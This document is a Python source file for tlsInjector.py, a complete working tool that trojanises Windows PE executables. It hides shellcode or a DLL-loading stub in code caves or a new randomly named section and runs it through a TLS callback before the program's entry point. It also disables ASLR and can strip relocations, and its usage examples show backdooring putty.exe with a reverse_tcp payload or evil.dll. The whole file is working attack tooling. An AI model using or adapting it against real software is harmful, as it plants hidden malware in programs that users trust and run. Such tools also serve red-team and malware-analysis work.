#!/usr/bin/env python

import pefile, sys, getopt, os, re, random, string, struct
from colorama import Fore, Style

__author__ = "Borja Merino"
__mail__ = "bmerinofe@gmail.com"
__version__ = "1.0"

class colors:
    GREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    RESET = '\033[0;0m'
    ORANGE = '\033[33m'

#Credits to nOps for the SectionDoubleP class: http://git.n0p.cc/?p=SectionDoubleP.git. This saved me a lot of work
class SectionDoublePError(Exception):
  pass

class SectionDoubleP:
    def __init__(self, pe):
        self.pe = pe

    def __adjust_optional_header(self):
        """ Recalculates the SizeOfImage, SizeOfCode, SizeOfInitializedData and
            SizeOfUninitializedData of the optional header.
        """

        # SizeOfImage = ((VirtualAddress + VirtualSize) of the new last section)
        self.pe.OPTIONAL_HEADER.SizeOfImage = (self.pe.sections[-1].VirtualAddress +
                                                self.pe.sections[-1].Misc_VirtualSize)

        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        # Recalculating the sizes by iterating over every section and checking if
        # the appropriate characteristics are set.
        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                # Section contains code.
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                # Section contains initialized data.
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                # Section contains uninitialized data.
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    def __add_header_space(self):
        """ To make space for a new section header a buffer filled with nulls is added at the
            end of the headers. The buffer has the size of one file alignment.
            The data between the last section header and the end of the headers is copied to
            the new space (everything moved by the size of one file alignment). If any data
            directory entry points to the moved data the pointer is adjusted.
        """

        FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
        SizeOfHeaders = self.pe.OPTIONAL_HEADER.SizeOfHeaders

        data = '\x00' * FileAlignment

        # Adding the null buffer.
        self.pe.__data__ = (self.pe.__data__[:SizeOfHeaders] + data +
                            self.pe.__data__[SizeOfHeaders:])

        section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

        # Copying the data between the last section header and SizeOfHeaders to the newly allocated
        # space.
        new_section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28
        size = SizeOfHeaders - new_section_offset
        data = self.pe.get_data(new_section_offset, size)
        self.pe.set_bytes_at_offset(new_section_offset + FileAlignment, data)

        # Filling the space, from which the data was copied from, with NULLs.
        self.pe.set_bytes_at_offset(new_section_offset, '\x00' * FileAlignment)

        data_directory_offset = section_table_offset - self.pe.OPTIONAL_HEADER.NumberOfRvaAndSizes * 0x8

        # Checking data directories if anything points to the space between the last section header
        # and the former SizeOfHeaders. If that's the case the pointer is increased by FileAlignment.
        for data_offset in xrange(data_directory_offset, section_table_offset, 0x8):
            data_rva = self.pe.get_dword_from_offset(data_offset)

            if new_section_offset <= data_rva and data_rva < SizeOfHeaders:
                self.pe.set_dword_at_offset(data_offset, data_rva + FileAlignment)

        SizeOfHeaders_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                        self.pe.FILE_HEADER.sizeof() + 0x3C)

        # Adjusting the SizeOfHeaders value.
        self.pe.set_dword_at_offset(SizeOfHeaders_offset, SizeOfHeaders + FileAlignment)

        section_raw_address_offset = section_table_offset + 0x14

        # The raw addresses of the sections are adjusted.
        for section in self.pe.sections:
            if section.PointerToRawData != 0:
                self.pe.set_dword_at_offset(section_raw_address_offset, section.PointerToRawData+FileAlignment)

            section_raw_address_offset += 0x28

        # All changes in this method were made to the raw data (__data__). To make these changes
        # accessbile in self.pe __data__ has to be parsed again. Since a new pefile is parsed during
        # the init method, the easiest way is to replace self.pe with a new pefile based on __data__
        # of the old self.pe.
        self.pe = pefile.PE(data=self.pe.__data__)

    def __is_null_data(self, data):
        """ Checks if the given data contains just null bytes.
        """

        for char in data:
            if char != '\x00':
                return False
        return True

    def push_back(self, Name, VirtualSize=0x00000000, VirtualAddress=0x00000000,
                RawSize=0x00000000, RawAddress=0x00000000, RelocAddress=0x00000000,
                Linenumbers=0x00000000, RelocationsNumber=0x0000, LinenumbersNumber=0x0000,
                Characteristics=0xE00000E0, Data=""):
        """ Adds the section, specified by the functions parameters, at the end of the section
            table.
            If the space to add an additional section header is insufficient, a buffer is inserted
            after SizeOfHeaders. Data between the last section header and the end of SizeOfHeaders
            is copied to +1 FileAlignment. Data directory entries pointing to this data are fixed.

            A call with no parameters creates the same section header as LordPE does. But for the
            binary to be executable without errors a VirtualSize > 0 has to be set.

            If a RawSize > 0 is set or Data is given the data gets aligned to the FileAlignment and
            is attached at the end of the file.
        """

        if self.pe.FILE_HEADER.NumberOfSections == len(self.pe.sections):

            FileAlignment = self.pe.OPTIONAL_HEADER.FileAlignment
            SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment


            if len(Name) > 8:
                raise SectionDoublePError("The name is too long for a section.")

            if (    VirtualAddress < (self.pe.sections[-1].Misc_VirtualSize +
                                        self.pe.sections[-1].VirtualAddress)
                or  VirtualAddress % SectionAlignment != 0):

                if (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) != 0:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize -
                        (self.pe.sections[-1].Misc_VirtualSize % SectionAlignment) + SectionAlignment)
                else:
                    VirtualAddress =    \
                        (self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize)

            if VirtualSize < len(Data):
                VirtualSize = len(Data)

            if (len(Data) % FileAlignment) != 0:
                # Padding the data of the section.
                Data += '\x00' * (FileAlignment - (len(Data) % FileAlignment))

            if RawSize != len(Data):
                if (    RawSize > len(Data)
                    and (RawSize % FileAlignment) == 0):
                    Data += '\x00' * (RawSize - (len(Data) % RawSize))
                else:
                    RawSize = len(Data)


            section_table_offset = (self.pe.DOS_HEADER.e_lfanew + 4 +
                self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader)

            # If the new section header exceeds the SizeOfHeaders there won't be enough space
            # for an additional section header. Besides that it's checked if the 0x28 bytes
            # (size of one section header) after the last current section header are filled
            # with nulls/ are free to use.
            if (        self.pe.OPTIONAL_HEADER.SizeOfHeaders <
                        section_table_offset + (self.pe.FILE_HEADER.NumberOfSections+1)*0x28
                or not  self.__is_null_data(self.pe.get_data(section_table_offset +
                        (self.pe.FILE_HEADER.NumberOfSections)*0x28, 0x28))):

                # Checking if more space can be added.
                if self.pe.OPTIONAL_HEADER.SizeOfHeaders < self.pe.sections[0].VirtualAddress:

                    self.__add_header_space()
                else:
                    raise SectionDoublePError("No more space can be added for the section header.")


            # The validity check of RawAddress is done after space for a new section header may
            # have been added because if space had been added the PointerToRawData of the previous
            # section would have changed.
            if (RawAddress != (self.pe.sections[-1].PointerToRawData +
                                    self.pe.sections[-1].SizeOfRawData)):
                    RawAddress =     \
                        (self.pe.sections[-1].PointerToRawData + self.pe.sections[-1].SizeOfRawData)


            # Appending the data of the new section to the file.
            if len(Data) > 0:
                self.pe.__data__ = (self.pe.__data__[:RawAddress] + Data + \
                                    self.pe.__data__[RawAddress:])

            section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections*0x28

            # Manually writing the data of the section header to the file.
            self.pe.set_bytes_at_offset(section_offset, Name)
            self.pe.set_dword_at_offset(section_offset+0x08, VirtualSize)
            self.pe.set_dword_at_offset(section_offset+0x0C, VirtualAddress)
            self.pe.set_dword_at_offset(section_offset+0x10, RawSize)
            self.pe.set_dword_at_offset(section_offset+0x14, RawAddress)
            self.pe.set_dword_at_offset(section_offset+0x18, RelocAddress)
            self.pe.set_dword_at_offset(section_offset+0x1C, Linenumbers)
            self.pe.set_word_at_offset(section_offset+0x20, RelocationsNumber)
            self.pe.set_word_at_offset(section_offset+0x22, LinenumbersNumber)
            self.pe.set_dword_at_offset(section_offset+0x24, Characteristics)

            self.pe.FILE_HEADER.NumberOfSections +=1

            # Parsing the section table of the file again to add the new section to the sections
            # list of pefile.
            self.pe.parse_sections(section_table_offset)

            self.__adjust_optional_header()
        else:
            raise SectionDoublePError("The NumberOfSections specified in the file header and the " + \
                "size of the sections list of pefile don't match.")

        return self.pe

def banner():
  print colors.FAIL +  "\n __| |      __|    _ _|        _)             |              "
  print             " |   |    \__ \      |     \    |   -_)   _|   _|   _ \   _| "
  print             "_|  ____| ____/    ___| _| _|   | \___| \__| \__| \___/ _|   "
  print             "                              __/              @BorjaMerino  \n" + colors.RESET

def usage():
  banner()
  print colors.RESET + "Info:"
  print colors.GREEN +"  Inject a shellcode into a binary and run it through a TLS callback"
  print colors.RESET + "\nUsage:"
  print colors.GREEN +"  -s <file>      - Shellcode to be executed by the TLS callback"
  print "  -f <file>      - Target binary "
  print "  -o <file>      - Output file (default: tls_injected.exe) "
  print "  -t             - Create a new section (no code caves search) "
  print "  -r             - Set basereloc directory to 0x0"
  print "  -l <path dll>  - Loadlibrary payload: the shellcode will load the DLL supplied"
  print "  -h             - Help"

  print colors.RESET +"\nExamples:"
  print colors.GREEN + "    python tlsInjector.py -s reverse_tcp.bin -f putty.exe -r"
  print "    python tlsInjector.py -f putty.exe -l evil.dll -t \n" + colors.RESET


def open_file(arg,mode):
  try:
    file =  open(arg,mode).read()
  except IOError as e:
    print colors.FAIL + str(e) + colors.RESET
    sys.exit(1)
  return file

def info_section(section):
    print colors.ORANGE + "    Name:                      "           + section.Name
    print "    RelativeVirtualAddress:    " + str(hex(section.VirtualAddress))
    print "    SizeOfRawData:             "  + str(hex(section.SizeOfRawData))
    print "    PointerToRawData:          "  + str(hex(section.PointerToRawData))
    print "    VirtualSize:               "  + str(hex(section.Misc_VirtualSize)) + colors.RESET

# Organize sections: first list: executable sections, second: the others
def organize_sections(sections):
  sections_exe = []
  sections_data = []
  for section in sections:
    # 0x20000000 IMAGE_SCN_MEM_EXECUTE
    # 0x40000000 IMAGE_SCN_MEM_READ
    # 0x00000020 IMAGE_SCN_CNT_CODE
    if all(section.Characteristics & n for n in [0x20000000, 0x40000000, 0x00000020]):
      sections_exe.append(section)
    else:
      sections_data.append(section)
  return [sections_exe,sections_data]

def create_section(pe,shellcode,flags):
  sections = SectionDoubleP(pe)
  sectionName = '.' + ''.join(random.choice(string.lowercase) for i in range(random.randint(1, 6)))
  try:
    pe = sections.push_back(Characteristics=flags, Data=shellcode, Name=sectionName)
    print colors.GREEN + "[+] New section added" + colors.RESET
    info_section(pe.sections[-1])
  except SectionDoublePError as e:
    print colors.FAIL + str(e)
    sys.exit(1)
  return

# Update the content of the TLS structure to point to the shellcode
def update_tls_structure(rva,pe):
  # Set AddressOfIndex (It will point to the same structure, SizeOfZeroFill field)
  pe.set_dword_at_rva(rva+8,pe.OPTIONAL_HEADER.ImageBase+rva+16)
  # Set AddressOfCallBacks to point to the callbacks array
  pe.set_dword_at_rva(rva+12,pe.OPTIONAL_HEADER.ImageBase+rva+24)
  print colors.GREEN + "[+] AddressOfCallBacks pointing to the array of callback addresses (va: 0x%x)" % (pe.OPTIONAL_HEADER.ImageBase+rva+24) + colors.RESET
  # Set first pointer of the callbacks array to point to the Shellcode
  pe.set_dword_at_rva(rva+24,pe.OPTIONAL_HEADER.ImageBase+rva+32)
  print colors.GREEN + "[+] First callback entry pointing to the shellcode (va: 0x%x)" % (pe.OPTIONAL_HEADER.ImageBase+rva+32) + colors.RESET
  # Update the IMAGE_DIRECTORY_ENTRY_TLS.
  pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].VirtualAddress = rva
  pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].Size = 0x18
  print colors.GREEN + "[+] IMAGE_DIRECTORY_ENTRY_TLS updated" + colors.RESET
  print colors.ORANGE + "    VirtualAddress: 0x%x " % (pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].VirtualAddress)
  print colors.ORANGE + "    Size: 0x%x " % (pe.OPTIONAL_HEADER.DATA_DIRECTORY[9].Size)


def get_codecaves(section,binary,size):
  codecaves = []
  raw_offset = section.PointerToRawData
  length = section.SizeOfRawData
  data = binary[raw_offset:raw_offset + length]
  offsets = [m.start() for m in re.finditer('\x00'*(size), data)]

  if offsets:
    print colors.ORANGE + "    %d code caves found in %s" % (len(offsets),section.Name) + colors.RESET
    codecaves.append(section)
    codecaves.append(offsets)

  return codecaves


def search_codecaves(sections_org,binary,size):
  print colors.GREEN + "[+] Searching code caves (%d bytes) in executable sections..." % (size) + colors.RESET

  for section in sections_org[0]:
    codecaves = get_codecaves(section,binary,size)
    if codecaves:
        return codecaves

  print colors.FAIL + "[-] Code caves not found in executable sections. Taking a look at others..." + colors.RESET
  for section in sections_org[1]:
    codecaves = get_codecaves(section,binary,size)
    if codecaves:
      return codecaves

  print colors.FAIL + "[-] Code caves not found in any sections. Taking another approach..." + colors.RESET


# Inject the shellcode in the offset indicated
def inject_shellcode(binary, shellcode, offset_cave):
  binary = binary[:offset_cave ] + shellcode + binary [offset_cave+len(shellcode):]
  return binary

def section_manage(pe,shellcode):
  create_section(pe,shellcode,0xE0000020)
  update_tls_structure(pe.sections[-1].VirtualAddress,pe)

def inject_tls(binary,shellcode):
  print colors.GREEN + "[+] Shellcode size: %s bytes" % len(shellcode) + colors.RESET
  pe = pefile.PE(data=binary)
  if not hasattr(pe, 'DIRECTORY_ENTRY_TLS'):
    print colors.GREEN + "[+] TLS Directory not present" + colors.RESET
    # Add the 32 bytes TLS structure to the shellcode
    shellcode = str('\0'*32) + shellcode
    if section:
      section_manage(pe, shellcode)
    else:
      sections_org = organize_sections(pe.sections)
      codecaves = search_codecaves(sections_org,binary,len(shellcode))
      if codecaves:
        # Get a random offset
        offset = codecaves[1][random.randint(0,len(codecaves[1])-1)]
        raw_offset = codecaves[0].PointerToRawData + offset
        rva = offset + codecaves[0].VirtualAddress
        print colors.GREEN + "[+] Random code cave chosen at raw offset: 0x%x (rva: 0x%x section: %s)" % (raw_offset,rva,codecaves[0].Name) + colors.RESET
        binary = inject_shellcode(binary,shellcode,raw_offset)
        print colors.GREEN + "[+] Code cave injected" + colors.RESET
        pe = pefile.PE(data=binary)

        for n in pe.sections:
            if n.VirtualAddress == codecaves[0].VirtualAddress:
              n.Characteristics = 0xE0000020
              print colors.GREEN + "[+] Characteristics of %s changed to 0xE0000020" % (codecaves[0].Name) + colors.RESET
              break

        update_tls_structure(rva,pe)
      # Not code caves found
      else:
        section_manage(pe, shellcode)

  # DIRECTORY_ENTRY_TLS present
  else:
    print colors.FAIL + "[-] The binary does already have the TLS Directory. I will be updated soon ..." + colors.RESET

  # disable ASLR
  pe.OPTIONAL_HEADER.DllCharacteristics &= ~pefile.DLL_CHARACTERISTICS['IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE']

  if reloc and pe.OPTIONAL_HEADER.DATA_DIRECTORY[5].VirtualAddress != 0x0:
      pe.OPTIONAL_HEADER.DATA_DIRECTORY[5].VirtualAddress = 0x0
      pe.OPTIONAL_HEADER.DATA_DIRECTORY[5].Size = 0x0
      print colors.GREEN + "[+] IMAGE_DIRECTORY_ENTRY_BASERELOC set to 0x0"
      print colors.ORANGE + "    VirtualAddress: 0x%x" % pe.OPTIONAL_HEADER.DATA_DIRECTORY[5].VirtualAddress
      print colors.ORANGE + "    Size:           0x%x" % pe.OPTIONAL_HEADER.DATA_DIRECTORY[5].Size + colors.RESET

  return pe

section = False
reloc = False


def main(argv):
  dll = False

  try:
    opts, args = getopt.getopt(sys.argv[1:],"rto:f:s:hl:")
  except getopt.GetoptError as err:
    print colors.FAIL +  "Error: %s. Type -h for help" % (str(err)) + colors.RESET
    sys.exit(1)

  for opt, arg in opts:
    if opt in ("-h","--help"):
      usage()
      sys.exit(1)
    elif opt in ("-f"):
      binary = open_file(arg,"rb")
    elif opt in ("-l"):
      dll = arg
    elif opt in ("-o"):
      output = arg
    elif opt in ("-t"):
      global section
      section = True
    elif opt in ("-r"):
      global reloc
      reloc = True
    elif opt in ("-s"):
      shellcode = open_file(arg,"rb")

  if 'binary' not in locals():
     usage()
     sys.exit(1)

  if 'shellcode' not in locals() and not dll:
    print colors.FAIL  + "[!] You must supply a shellcode file or the LoadLibrary payload\n" + colors.RESET
    sys.exit(1)

  banner()
  if dll:
    loader = "\x4D\x5A\xE8\x00\x00\x00\x00\x5B\x52\x45\x55\x89\xE5\x81\xC3\xEF\xBE\xAD\xDE\xFF\xD3\xC2\x0C\x00"
    dll = pefile.PE(dll)
    addr = dll.get_offset_from_rva(dll.DIRECTORY_ENTRY_EXPORT.symbols[0].address)
    addr = addr - 7
    addr = struct.pack("<I", addr)
    loader = loader.replace("\xEF\xBE\xAD\xDE", addr)
    size = len(loader)
    shellcode = loader + dll.__data__[size:]

  pe = inject_tls(binary,shellcode)

  if 'output' not in locals():
    output = "tls_injected.exe"

  pe.write(filename=output)
  print colors.BOLD  + "[+] Injection completed: %s (%d bytes)" % (output,os.path.getsize(output)) + colors.RESET

if __name__ == '__main__':
    main(sys.argv[1:])
